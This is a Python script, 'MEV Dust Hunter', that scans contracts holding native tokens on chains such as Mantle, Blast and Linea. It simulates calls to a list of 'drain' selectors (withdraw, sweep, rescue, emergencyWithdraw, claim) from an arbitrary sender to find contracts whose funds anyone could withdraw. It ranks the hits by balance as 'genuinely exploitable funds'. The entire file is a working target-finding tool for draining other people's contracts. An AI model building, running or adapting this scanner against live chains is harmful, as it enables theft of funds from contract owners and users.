#!/usr/bin/env python3
"""
MEV DUST HUNTER
================
Looks for genuinely exploitable funds on the chain by combining:

  1. Wide scan for contracts holding native ETH on L2s where MEV is weak
     (Mantle, Mode, Blast, Aurora, Metis, Celo, Cronos, Moonbeam, Linea, Scroll)

  2. eth_estimateGas + eth_call simulation from a random EOA against every
     known public-drain selector. If estimateGas SUCCEEDS (no revert) AND
     the call doesn't revert, we have a candidate.

  3. Cross-check: if estimateGas > 30000, the function actually does work
     (just returning 0x usually consumes <30k gas).

  4. Final score = balance / estimated_gas_cost. Higher = more profitable.
"""
import asyncio, json, os, ssl, time, sys
import aiohttp, certifi

SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))

TEST_FROM = '0xCafeBabeCafeBabeCafeBabeCafeBabeCafeBabe'

DRAIN_FUNCS = {
    '3ccfd60b': ('withdraw()', ''),
    '853828b6': ('withdrawAll()', ''),
    'e9fad8ee': ('exit()', ''),
    '4ae53a7c': ('sweep()', ''),
    'c30436e9': ('rescue()', ''),
    'b95459e4': ('rescueETH()', ''),
    '0b1e4b88': ('emergencyWithdraw()', ''),
    'd2f7265a': ('emergencyExit()', ''),
    '4e71d92d': ('claim()', ''),
    'd0a9405c': ('forward()', ''),
    '6b9f96ea': ('flush()', ''),
    'a64f0bb9': ('recoverETH()', ''),
    '3d18b912': ('getReward()', ''),
    'a430a05a': ('recover()', ''),
    'db006a75': ('redeem()', ''),
    '2e1a7d4d_zero': ('withdraw(0)', '0' * 64),
    '2e1a7d4d_max': ('withdraw(max)', 'f' * 64),
}


async def rpc_call(session, sem, rpcs, method, params, timeout=8.0):
    payload = {'jsonrpc': '2.0', 'method': method, 'params': params, 'id': 1}
    async with sem:
        for url in rpcs:
            try:
                async with session.post(url, json=payload,
                                        timeout=aiohttp.ClientTimeout(total=timeout)) as resp:
                    if resp.status != 200:
                        continue
                    data = await resp.json()
                    if 'error' in data:
                        return {'error': data['error']}
                    return {'result': data.get('result')}
            except Exception:
                continue
    return None


async def get_balance(session, sem, rpcs, addr):
    r = await rpc_call(session, sem, rpcs, 'eth_getBalance', [addr, 'latest'])
    if r and 'result' in r and r['result']:
        return int(r['result'], 16)
    return 0


async def estimate_gas(session, sem, rpcs, addr, sender, calldata):
    params = [{'from': sender, 'to': addr, 'data': calldata, 'value': '0x0'}]
    r = await rpc_call(session, sem, rpcs, 'eth_estimateGas', params)
    if r is None or 'error' in r:
        return None, r.get('error', {}).get('message', '') if r else 'rpc_fail'
    try:
        return int(r['result'], 16), None
    except Exception:
        return None, 'parse_fail'


async def call_contract(session, sem, rpcs, addr, sender, calldata):
    params = [{'from': sender, 'to': addr, 'data': calldata, 'value': '0x0'}, 'latest']
    r = await rpc_call(session, sem, rpcs, 'eth_call', params)
    if r is None:
        return False, 'rpc_fail'
    if 'error' in r:
        return False, r['error'].get('message', '')[:100]
    return True, r.get('result', '0x')


async def fuzz_contract(session, sem, rpcs, c):
    addr = c['address']
    bal = await get_balance(session, sem, rpcs, addr)
    if bal == 0:
        return None

    findings = []
    for sel_key, (sig, args) in DRAIN_FUNCS.items():
        sel = sel_key.split('_')[0]
        calldata = '0x' + sel + args

        success, ret = await call_contract(session, sem, rpcs, addr, TEST_FROM, calldata)
        if not success:
            continue

        gas, err = await estimate_gas(session, sem, rpcs, addr, TEST_FROM, calldata)
        if gas is None or gas < 25000:
            continue

        findings.append({
            'sig': sig,
            'gas': gas,
            'returned': str(ret)[:50],
        })

    return {
        'chain': c['chain'],
        'name': c.get('name', '?'),
        'address': addr,
        'balance_eth': bal / 1e18,
        'findings': findings,
    }


async def main():
    chains = json.load(open(os.path.join(SCRIPT_DIR, 'data', 'chains.json')))['chains']
    contracts = json.load(open(os.path.join(SCRIPT_DIR, 'data', 'contracts_multichain.json')))['contracts']
    contracts = [c for c in contracts
                 if not c.get('_comment') and c.get('address', '').startswith('0x')]

    print(f'[*] MEV Dust Hunter: {len(contracts)} contracts x {len(DRAIN_FUNCS)} drain selectors')
    print(f'[*] Strategy: eth_call + eth_estimateGas from random EOA, gas > 25k = real function')

    sem = asyncio.Semaphore(20)
    ssl_ctx = ssl.create_default_context(cafile=certifi.where())
    connector = aiohttp.TCPConnector(limit=40, ssl=ssl_ctx)

    t0 = time.time()
    candidates = []

    async with aiohttp.ClientSession(connector=connector) as session:
        by_chain = {}
        for c in contracts:
            by_chain.setdefault(c['chain'], []).append(c)

        for chain_name, ch_contracts in by_chain.items():
            ch_cfg = chains.get(chain_name)
            if not ch_cfg:
                continue
            rpcs = ch_cfg['rpcs']
            print(f'\n  Chain: {chain_name}  ({len(ch_contracts)} contracts)')
            tasks = [fuzz_contract(session, sem, rpcs, c) for c in ch_contracts]
            for done in asyncio.as_completed(tasks):
                r = await done
                if r and r['findings']:
                    candidates.append(r)
                    print(f"    *** {r['chain']:10s} {r['name'][:30]:30s} bal={r['balance_eth']:>10,.4f}  hits={len(r['findings'])}")

    elapsed = time.time() - t0
    candidates.sort(key=lambda r: -r['balance_eth'])

    print('\n' + '=' * 100)
    print('  MEV DUST HUNTER REPORT')
    print('=' * 100)
    print(f'  Scanned in {elapsed:.1f}s')
    print(f'  {len(candidates)} contracts have non-reverting drain candidates')

    if candidates:
        print('\n  TOP CANDIDATES (by balance):')
        for i, r in enumerate(candidates[:50]):
            print(f"\n  [{i+1}] {r['chain']:10s} {r['name']}  ({r['balance_eth']:,.4f} ETH/native)")
            print(f"      addr: {r['address']}")
            for f in r['findings']:
                print(f"      => {f['sig']:25s} gas={f['gas']:>8}  ret={f['returned']}")

    out = os.path.join(SCRIPT_DIR, 'results', 'mev_dust_results.json')
    json.dump(candidates, open(out, 'w'), indent=2)
    print(f'\n[*] Saved: {out}')


if __name__ == '__main__':
    asyncio.run(main())
